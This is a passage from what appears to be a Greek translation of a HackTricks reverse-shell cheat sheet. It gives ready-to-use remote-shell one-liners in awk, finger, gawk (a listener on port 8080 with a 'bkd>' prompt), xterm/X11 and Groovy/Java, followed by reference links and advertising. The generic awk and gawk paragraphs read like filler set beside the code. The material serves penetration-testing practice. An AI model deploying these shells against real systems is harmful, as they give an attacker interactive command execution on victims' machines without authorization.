- `else`: Εκτελεί μια ενέργεια αν μια συνθήκη δεν είναι αληθής.
- `for`: Επαναλαμβάνει μια ενέργεια για κάθε στοιχείο σε μια λίστα.
- `while`: Επαναλαμβάνει μια ενέργεια όσο μια συνθήκη είναι αληθής.

Με τη χρήση αυτών των εντολών, μπορείτε να δημιουργήσετε πολύπλοκους κανόνες για την επεξεργασία του κειμένου. Το Awk είναι ένα ισχυρό εργαλείο που μπορεί να σας βοηθήσει στην ανάλυση και την επεξεργασία κειμένου στο Linux.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
Επιτιθέμενος

## Finger

**Επιτιθέμενος**
```bash
while true; do nc -l 79; done
```
Για να στείλετε την εντολή, γράψτε την, πατήστε enter και πατήστε CTRL+D (για να σταματήσει το STDIN)

**Θύμα**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Το Gawk είναι ένα ισχυρό εργαλείο για την επεξεργασία και ανάλυση κειμένου στο Linux. Χρησιμοποιείται συχνά για την εξόρυξη δεδομένων από αρχεία κειμένου και την εκτέλεση προηγμένων επεξεργασιών. Το Gawk υποστηρίζει πολλές λειτουργίες, όπως την αναζήτηση και αντικατάσταση προτύπων, την επεξεργασία πεδίων και την υπολογιστική επεξεργασία.

Για να χρησιμοποιήσετε το Gawk, μπορείτε να το εκτελέσετε από το τερματικό χρησιμοποιώντας την εντολή `gawk`. Μπορείτε να του περάσετε ένα αρχείο κειμένου ως είσοδο ή να του δώσετε εντολές απευθείας από το τερματικό.

Οι βασικές εντολές του Gawk περιλαμβάνουν την εκτύπωση γραμμών, την αναζήτηση και αντικατάσταση προτύπων, την επεξεργασία πεδίων και την εκτέλεση μαθηματικών πράξεων. Μπορείτε επίσης να χρησιμοποιήσετε τις μεταβλητές και τις συναρτήσεις του Gawk για πιο προηγμένες επεξεργασίες.

Το Gawk είναι ένα ισχυρό εργαλείο που μπορεί να σας βοηθήσει στην ανάλυση και επεξεργασία κειμένου στο Linux. Μάθετε τις βασικές εντολές και αρχίστε να το χρησιμοποιείτε για να αυξήσετε την αποτελεσματικότητά σας στον χειρισμό των αρχείων κειμένου.
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

Αυτό θα προσπαθήσει να συνδεθεί στο σύστημά σας στη θύρα 6001:
```bash
xterm -display 10.0.0.1:1
```
Για να πιάσετε το αντίστροφο κέλυφος μπορείτε να χρησιμοποιήσετε (το οποίο θα ακούει στη θύρα 6001):
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

από [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) ΣΗΜΕΙΩΣΗ: Ο αντίστροφος κέλυφος της Java λειτουργεί επίσης για την Groovy
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Αναφορές
* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που είναι πιο σημαντικές, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Ο Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίχημα, από τις διεπαφές προγραμματισμού εφαρμογών (APIs) μέχρι τις ιστοσελίδες και τα συστήματα στον νέφος. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
